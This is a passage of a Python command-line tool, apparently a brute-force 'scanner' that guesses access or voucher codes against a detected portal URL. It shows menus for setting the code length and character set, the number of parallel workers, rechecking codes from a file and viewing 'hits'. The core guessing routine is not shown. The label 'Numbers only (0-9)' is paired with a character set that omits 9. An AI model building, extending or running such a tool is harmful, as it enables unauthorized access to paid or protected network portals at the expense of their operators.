    print(f"  {white}[1]{reset} 🔢 Numbers only (0-9)")
    print(f"  {white}[2]{reset} 🔤 Letters only (a-z)")
    print(f"  {white}[3]{reset} 🔣 Mix (numbers + letters)")
    choice = input(f"{bright_red}➤ Your choice (1/2/3): {reset}").strip()

    if choice == '1':
        char_set = '012345678'
    elif choice == '2':
        char_set = 'abcdefghijkmnpqrstuvwxyz'
    elif choice == '3':
        char_set = '2345678abcdefghijkmnpqrstuvwxyz'
    else:
        print(f"{bright_red}❌ Invalid choice.{reset}")
        return

    try:
        length = int(input(f"{bright_red}➤ Enter code length (e.g., 6, 7, 8): {reset}").strip())
        if length < 1:
            raise ValueError
    except:
        print(f"{bright_red}❌ Invalid length.{reset}")
        return

    ud['mode'] = 'custom'
    ud['char_set'] = char_set
    ud['code_len'] = length
    ud['start_digit'] = None
    print(f"{bold_green}✅ Mode set: length = {length}{reset}")


# ---------------- START RECHECK ----------------
async def start_recheck():
    ud = get_scanner_data()
    if not ud['portal_url']:
        print(f"\n{bright_red}⚠️ Portal URL not set! Let's detect it first.{reset}")
        await update_portal()
    if not ud['portal_url']:
        print(f"{bright_red}❌ Cannot start without Portal URL.{reset}")
        return
    file_path = input(f"{bright_red}➤ Enter path to file containing codes: {reset}").strip()
    if not os.path.exists(file_path):
        print(f"{bright_red}❌ File not found!{reset}")
        return
    with open(file_path, 'r') as f:
        codes = [line.strip() for line in f if line.strip()]
    if not codes:
        print(f"{bright_red}❌ File is empty.{reset}")
        return
    ud['recheck_queue'] = codes
    ud['mode'] = 'recheck'
    ud['GLOBAL_CHOICE'] = '4'
    print(f"{bold_green}📬 Loaded {len(codes)} codes for recheck. Starting scanner...{reset}")
    await run_scanner()


# ---------------- START NORMAL SCANNER ----------------
async def start_normal_scanner():
    ud = get_scanner_data()
    if not ud['portal_url']:
        print(f"\n{bright_red}⚠️ Portal URL not set! Let's detect it first.{reset}")
        await update_portal()
    if not ud['portal_url']:
        print(f"{bright_red}❌ Cannot start without Portal URL.{reset}")
        return
    if ud['mode'] == 'recheck':
        print(f"{bright_red}🔁 Switching to normal mode (num6).{reset}")
        ud['mode'] = 'num6'
        ud['char_set'] = '012345678'
        ud['code_len'] = 6
        ud['start_digit'] = None
    ud['GLOBAL_CHOICE'] = '3'
    print(f"{bold_green}🚀 Starting scanner in {ud['mode']} mode...{reset}")
    await run_scanner()


# ---------------- CONFIGURE WORKERS ----------------
def configure_workers():
    ud = get_scanner_data()
    print(f"\n{bright_red}⚙️ --- Configure Workers ---{reset}")
    while True:
        default_main = ud['num_workers']
        inp = input(f"{bright_red}➤ Workers (default {default_main}): {reset}").strip()
        if not inp:
            break
        try:
            val = int(inp)
            if val < 1:
                print(f"{bright_red}⚠️ Positive number only.{reset}")
                continue
            ud['num_workers'] = val
            break
        except ValueError:
            print(f"{bright_red}⚠️ Invalid number.{reset}")
    print(f"{bold_green}✅ Workers set to {ud['num_workers']}{reset}\n")


# ---------------- MAIN MENU ----------------
def print_menu():
    show_menu_banner()
    print(f"  {bright_red}[1]{reset} {white}🌐 Update Portal URL{reset}")
    print(f"  {bright_red}[2]{reset} {white}⚙️  Change Mode{reset}")
    print(f"  {bold_green}[3]{reset} {white}🚀 Start Scanner{reset}")
    print(f"  {magenta}[4]{reset} {white}🔄 Recheck (from file){reset}")
    print(f"  {cyan}[5]{reset} {white}📋 View Hits{reset}")
    print(f"  {bright_red}[6]{reset} {white}🚪 Exit{reset}")
    print(f"{bright_red}  ─────────────────────────────────────────────────────{reset}")


async def main():
    init_scanner_data()

    # 1. Boot loader — MS SYSTEM IS LOADING + 100%
    show_boot_loader()

    # 2. Workers config
    configure_workers()

    # 3. Main loop
    while True:
        print_menu()
        try:
            choice = await asyncio.to_thread(input, f"{bright_red}➤ Enter your choice: {reset}")
        except (KeyboardInterrupt, EOFError):
            print(f"\n{bright_red}🚪 Exiting...{reset}")
            break

        choice = choice.strip()
        if choice == '1':
            await update_portal()
        elif choice == '2':
            await change_mode()
        elif choice == '3':
            await start_normal_scanner()
        elif choice == '4':
            await start_recheck()
        elif choice == '5':
            show_hit_codes()
        elif choice == '6':
            print(f"{bright_red}🚪 Exiting... Thanks for using By MS{reset}")
            break
        else:
            print(f"{bright_red}❌ Invalid choice. Please try again.{reset}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass